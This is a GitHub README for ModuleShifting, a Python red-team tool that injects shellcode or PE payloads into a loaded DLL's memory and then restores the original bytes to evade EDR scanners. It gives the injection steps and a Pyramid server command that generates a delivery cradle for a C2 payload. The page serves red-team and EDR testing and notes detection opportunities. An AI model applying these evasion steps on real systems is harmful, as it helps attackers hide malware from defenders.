# https://github.com/naksyn/ModuleShifting

[Skip to content](https://github.com/naksyn/ModuleShifting#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/naksyn/ModuleShifting) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/naksyn/ModuleShifting) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/naksyn/ModuleShifting) to refresh your session.Dismiss alert

{{ message }}

[naksyn](https://github.com/naksyn)/ **[ModuleShifting](https://github.com/naksyn/ModuleShifting)** Public

- [Notifications](https://github.com/login?return_to=%2Fnaksyn%2FModuleShifting) You must be signed in to change notification settings
- [Fork\\
13](https://github.com/login?return_to=%2Fnaksyn%2FModuleShifting)
- [Star\\
128](https://github.com/login?return_to=%2Fnaksyn%2FModuleShifting)


Stealthier variation of Module Stomping and Module Overloading injection techniques that reduces memory IoCs. Implemented in Python ctypes


### License

[Apache-2.0 license](https://github.com/naksyn/ModuleShifting/blob/main/LICENSE)

[128\\
stars](https://github.com/naksyn/ModuleShifting/stargazers) [13\\
forks](https://github.com/naksyn/ModuleShifting/forks) [Branches](https://github.com/naksyn/ModuleShifting/branches) [Tags](https://github.com/naksyn/ModuleShifting/tags) [Activity](https://github.com/naksyn/ModuleShifting/activity)

[Star](https://github.com/login?return_to=%2Fnaksyn%2FModuleShifting)

[Notifications](https://github.com/login?return_to=%2Fnaksyn%2FModuleShifting) You must be signed in to change notification settings

# naksyn/ModuleShifting

main

[**1** Branch](https://github.com/naksyn/ModuleShifting/branches) [**0** Tags](https://github.com/naksyn/ModuleShifting/tags)

[Go to Branches page](https://github.com/naksyn/ModuleShifting/branches)[Go to Tags page](https://github.com/naksyn/ModuleShifting/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![naksyn](https://avatars.githubusercontent.com/u/59816245?v=4&size=40)](https://github.com/naksyn)[naksyn](https://github.com/naksyn/ModuleShifting/commits?author=naksyn)<br>[Update README.md](https://github.com/naksyn/ModuleShifting/commit/08d1fd5b3255a7b292c0a17ca9d0c6ed5a459844)<br>3 years agoSep 27, 2023<br>[08d1fd5](https://github.com/naksyn/ModuleShifting/commit/08d1fd5b3255a7b292c0a17ca9d0c6ed5a459844) · 3 years agoSep 27, 2023<br>## History<br>[8 Commits](https://github.com/naksyn/ModuleShifting/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/naksyn/ModuleShifting/commits/main/) 8 Commits |
| [moduleshifting](https://github.com/naksyn/ModuleShifting/tree/main/moduleshifting "moduleshifting") | [moduleshifting](https://github.com/naksyn/ModuleShifting/tree/main/moduleshifting "moduleshifting") | [Update \_\_init\_\_.py](https://github.com/naksyn/ModuleShifting/commit/fbd886bd5e82dd9579b6d05bcc634cb139844c06 "Update __init__.py  fixed check for non-existing section") | 3 years agoSep 27, 2023 |
| [LICENSE](https://github.com/naksyn/ModuleShifting/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/naksyn/ModuleShifting/blob/main/LICENSE "LICENSE") | [Initial commit](https://github.com/naksyn/ModuleShifting/commit/1fc4903b698ca772ab55c33dab84bb8cbee7687f "Initial commit") | 3 years agoMay 30, 2023 |
| [README.md](https://github.com/naksyn/ModuleShifting/blob/main/README.md "README.md") | [README.md](https://github.com/naksyn/ModuleShifting/blob/main/README.md "README.md") | [Update README.md](https://github.com/naksyn/ModuleShifting/commit/08d1fd5b3255a7b292c0a17ca9d0c6ed5a459844 "Update README.md") | 3 years agoSep 27, 2023 |
| View all files |

## Repository files navigation

[![Supported Python versions](https://camo.githubusercontent.com/b413597d37ccc8eae784ee4f9979e61fe739bbdcd0f6247e4aa0d68c6f1659ca/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f707974686f6e2d332e372b2d626c75652e737667)](https://camo.githubusercontent.com/b413597d37ccc8eae784ee4f9979e61fe739bbdcd0f6247e4aa0d68c6f1659ca/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f707974686f6e2d332e372b2d626c75652e737667)[![Twitter](https://camo.githubusercontent.com/3e2a6c7ad8f60db1d64964d88909cd29669e20118b51380a0ad11b261f7dd4ad/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f666f6c6c6f772f6e616b73796e3f6c6162656c3d6e616b73796e267374796c653d736f6369616c)](https://twitter.com/intent/follow?screen_name=naksyn)

# ModuleShifting

[Permalink: ModuleShifting](https://github.com/naksyn/ModuleShifting#moduleshifting)

This tool has been presented at the **[2023 x33fcon talk: "Improving the stealthiness of Memory Injection Techniques"](https://github.com/naksyn/talks/blob/main/x33fcon%202023%20-%20Improving%20the%20Stealthiness%20of%20Memory%20Injection%20Techniques.pdf) [\[Video\]](https://www.youtube.com/watch?v=_TEnBLt2JF4) [\[Blogpost\]](https://naksyn.com/edr%20evasion/2023/06/01/improving-the-stealthiness-of-memory-injections.html)**

# What is it

[Permalink: What is it](https://github.com/naksyn/ModuleShifting#what-is-it)

ModuleShifting is stealthier variation of Module Stomping and Module overloading injection technique.
It is actually implemented in Python ctypes so that it can be executed fully in memory via a Python interpreter and [Pyramid](https://github.com/naksyn/Pyramid), thus avoiding the usage of compiled loaders.

The technique can be used with PE or shellcode payloads, however, the stealthier variation is to be used with shellcode payloads that need to be **functionally independent from the final payload that the shellcode is loading.**

ModuleShifting, when used with shellcode payload, is performing the following operations:

1. Legitimate hosting dll is loaded via LoadLibrary
2. Change the memory permissions of a specified section to RW
3. Overwrite shellcode over the target section
4. add optional padding to better blend into false positive behaviour ( [more information here](https://www.forrest-orr.net/post/masking-malicious-memory-artifacts-part-ii-insights-from-moneta))
5. Change permissions to RX
6. Execute shellcode via function pointer - additional execution methods: function callback or CreateThread API
7. **Write original dll content over the executed shellcode** \- this step avoids leaving a malicious memory artifact on the image memory space of the hosting dll. The shellcode needs to be functionally independent from further stages otherwise execution will break.

[![immagine](https://private-user-images.githubusercontent.com/59816245/242038364-b78e13d1-07b0-4cce-ac67-0035e1241dbc.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTY4NzQsIm5iZiI6MTc3MTQxNjU3NCwicGF0aCI6Ii81OTgxNjI0NS8yNDIwMzgzNjQtYjc4ZTEzZDEtMDdiMC00Y2NlLWFjNjctMDAzNWUxMjQxZGJjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDEyMDkzNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTIxNmIyZDE4Zjg4ZTI4OTJiNGVlNWVjZDAyZjg1NDdlY2MyNWJkNTI3YjlmY2I4YThiZTA1MTE5NjkzYmVjNWImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.GChRzCqfjfG6WNvsyoZQ1zINjXi2l-6xAQi91oZ14NU)](https://private-user-images.githubusercontent.com/59816245/242038364-b78e13d1-07b0-4cce-ac67-0035e1241dbc.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTY4NzQsIm5iZiI6MTc3MTQxNjU3NCwicGF0aCI6Ii81OTgxNjI0NS8yNDIwMzgzNjQtYjc4ZTEzZDEtMDdiMC00Y2NlLWFjNjctMDAzNWUxMjQxZGJjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDEyMDkzNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTIxNmIyZDE4Zjg4ZTI4OTJiNGVlNWVjZDAyZjg1NDdlY2MyNWJkNTI3YjlmY2I4YThiZTA1MTE5NjkzYmVjNWImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.GChRzCqfjfG6WNvsyoZQ1zINjXi2l-6xAQi91oZ14NU)

When using a PE payload, ModuleShifting will perform the following operation:

1. Legitimate hosting dll is loaded via LoadLibrary
2. Change the memory permissions of a specified section to RW
3. copy the PE over the specified target point section-by-section
4. add optional padding to better blend into false positive behaviour
5. perform base relocation
6. resolve imports
7. finalize section by setting permissions to their native values (avoids the creation of RWX memory region)
8. TLS callbacks execution
9. Executing PE entrypoint

# Why it's useful

[Permalink: Why it's useful](https://github.com/naksyn/ModuleShifting#why-its-useful)

ModuleShifting can be used to inject a payload without dynamically allocating memory (i.e. VirtualAlloc) and compared to Module Stomping and Module Overloading is stealthier because it decreases the amount of IoCs generated by the injection technique itself.

There are 3 main differences between Module Shifting and some public implementations of Module stomping (one from [Bobby Cooke](https://github.com/boku7/Ninja_UUID_Runner) and [WithSecure](https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/))

1. Padding: when writing shellcode or PE, you can use padding to better blend into common False Positive behaviour (such as third-party applications or .net dlls writing x amount of bytes over their .text section).
2. Shellcode execution using function pointer. This helps in avoid a new thread creation or calling unusual function callbacks.
3. restoring of original dll content over the executed shellcode. **This is a key difference.**

The differences between Module Shifting and Module Overloading are the following:

1. The PE can be written starting from a specified section instead of starting from the PE of the hosting dll. Once the target section is chosen carefully, this can reduce the amount of IoCs generated (i.e. PE header of the hosting dll is not overwritten or less bytes overwritten on .text section etc.)
2. Padding that can be added to the PE payload itself to better blend into false positives.

Using a functionally independent shellcode payload such as an AceLdr Beacon Stageless shellcode payload, ModuleShifting is able to locally inject without dynamically allocating memory and at the moment generating **zero IoC on a Moneta and PE-Sieve scan**. I am aware that the AceLdr sleeping payloads can be caught with other great tools such as [Hunt-Sleeping-Beacon](https://github.com/thefLink/Hunt-Sleeping-Beacons), but the focus here is on the injection technique itself, not on the payload. In our case what is enabling more stealthiness in the injection is the shellcode functional independence, so that the written malicious bytes can be restored to its original content, effectively erasing the traces of the injection.

# Disclaimer

[Permalink: Disclaimer](https://github.com/naksyn/ModuleShifting#disclaimer)

All information and content is provided for educational purposes only. Follow instructions at your own risk. Neither the author nor his employer are responsible for any direct or consequential damage or loss arising from any person or organization.

# Credits

[Permalink: Credits](https://github.com/naksyn/ModuleShifting#credits)

This work has been made possible because of the knowledge and tools shared by incredible people like Aleksandra Doniec @ [hasherezade](https://twitter.com/hasherezade), Forest Orr and Kyle Avery. I heavily used [Moneta](https://github.com/forrest-orr/moneta), [PeSieve](https://github.com/hasherezade/pe-sieve), [PE-Bear](https://github.com/hasherezade/pe-bear) and [AceLdr](https://github.com/kyleavery/AceLdr) throughout all my learning process and they have been key for my understanding of this topic.

# Usage

[Permalink: Usage](https://github.com/naksyn/ModuleShifting#usage)

ModuleShifting can be used with [Pyramid](https://github.com/naksyn/Pyramid) and a Python interpreter to execute the local process injection fully in-memory, avoiding compiled loaders.

1. Clone the Pyramid repo:

`git clone https://github.com/naksyn/Pyramid`

2. Generate a shellcode payload with your preferred C2 and drop it into Pyramid **Delivery\_files** folder. See [Caveats](https://github.com/naksyn/ModuleShifting#caveats) section for payload requirements.
3. modify the parameters of moduleshifting.py script inside Pyramid Modules folder.
4. Start the Pyramid server:
`python3 pyramid.py -u testuser -pass testpass -p 443 -enc chacha20 -passenc superpass -generate -server 192.168.1.2 -setcradle moduleshifting.py`
5. execute the generated cradle code on a python interpreter.

### Demo

[Permalink: Demo](https://github.com/naksyn/ModuleShifting#demo)

module.shifting.mp4

# Caveats

[Permalink: Caveats](https://github.com/naksyn/ModuleShifting#caveats)

To successfully execute this technique you should use a shellcode payload that is capable of loading an additional self-sustainable payload in another area of memory. ModuleShifting has been tested with AceLdr payload, which is capable of loading an entire copy of Beacon on the heap, so breaking the functional dependency with the initial shellcode. This technique would work with any shellcode payload that has similar capabilities. So the initial shellcode becomes useless once executed and there's no reason to keep it in memory as an IoC.

A hosting dll with enough space for the shellcode on the targeted section should also be chosen, otherwise the technique will fail.

# Detection opportunities

[Permalink: Detection opportunities](https://github.com/naksyn/ModuleShifting#detection-opportunities)

Module Stomping and Module Shifting need to write shellcode on a legitimate dll memory space. ModuleShifting will eliminate this IoC after the cleanup phase but indicators could be spotted by scanners with realtime inspection capabilities.

[![immagine](https://private-user-images.githubusercontent.com/59816245/242038541-385f9a91-b39f-40e8-8a7a-e01da1de80c6.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTY4NzQsIm5iZiI6MTc3MTQxNjU3NCwicGF0aCI6Ii81OTgxNjI0NS8yNDIwMzg1NDEtMzg1ZjlhOTEtYjM5Zi00MGU4LThhN2EtZTAxZGExZGU4MGM2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDEyMDkzNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWZkNTViMzM1OTcxYjhjZDliODk1NTRkMThjYTY0Y2JmNTI5NzBhYTc2NWJhZjYxZmU2NzdjZDZlNWNlMGE5NzAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.xpKdk7Wz_uh8ozUw0ZGFC6nUiMiScTQzzpFF2Nt34cA)](https://private-user-images.githubusercontent.com/59816245/242038541-385f9a91-b39f-40e8-8a7a-e01da1de80c6.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTY4NzQsIm5iZiI6MTc3MTQxNjU3NCwicGF0aCI6Ii81OTgxNjI0NS8yNDIwMzg1NDEtMzg1ZjlhOTEtYjM5Zi00MGU4LThhN2EtZTAxZGExZGU4MGM2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDEyMDkzNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWZkNTViMzM1OTcxYjhjZDliODk1NTRkMThjYTY0Y2JmNTI5NzBhYTc2NWJhZjYxZmU2NzdjZDZlNWNlMGE5NzAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.xpKdk7Wz_uh8ozUw0ZGFC6nUiMiScTQzzpFF2Nt34cA)

## About

Stealthier variation of Module Stomping and Module Overloading injection techniques that reduces memory IoCs. Implemented in Python ctypes


### Topics

[python](https://github.com/topics/python "Topic: python") [injection](https://github.com/topics/injection "Topic: injection") [hacking](https://github.com/topics/hacking "Topic: hacking") [ctypes](https://github.com/topics/ctypes "Topic: ctypes") [redteam-tools](https://github.com/topics/redteam-tools "Topic: redteam-tools") [edr-testing](https://github.com/topics/edr-testing "Topic: edr-testing")

### Resources

[Readme](https://github.com/naksyn/ModuleShifting#readme-ov-file)

### License

[Apache-2.0 license](https://github.com/naksyn/ModuleShifting#Apache-2.0-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/naksyn/ModuleShifting).

[Activity](https://github.com/naksyn/ModuleShifting/activity)

### Stars

[**128**\\
stars](https://github.com/naksyn/ModuleShifting/stargazers)

### Watchers

[**2**\\
watching](https://github.com/naksyn/ModuleShifting/watchers)

### Forks

[**13**\\
forks](https://github.com/naksyn/ModuleShifting/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fnaksyn%2FModuleShifting&report=naksyn+%28user%29)

## [Releases](https://github.com/naksyn/ModuleShifting/releases)

No releases published

## [Packages\  0](https://github.com/users/naksyn/packages?repo_name=ModuleShifting)

No packages published

## Languages

- [Python100.0%](https://github.com/naksyn/ModuleShifting/search?l=python)

You can’t perform that action at this time.